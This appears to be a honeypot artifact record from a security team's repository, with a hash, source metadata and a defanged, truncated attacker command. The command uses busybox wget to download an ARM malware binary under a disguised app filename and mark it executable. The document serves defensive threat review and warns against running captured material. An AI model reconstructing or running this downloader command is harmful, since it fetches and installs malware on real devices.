# c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `c7a6b5dbbaac4d56d1541040ee58fbe806cead4c38d9f4bfa6eeab8a5f2274bf` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
shell:busybox wget hxxp://94[.]154[.]43[.]XXX/rebirth.arm7 -O /data/local/tmp/com.supercell[.]clashroyal; chmod 777 /data/local/t
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
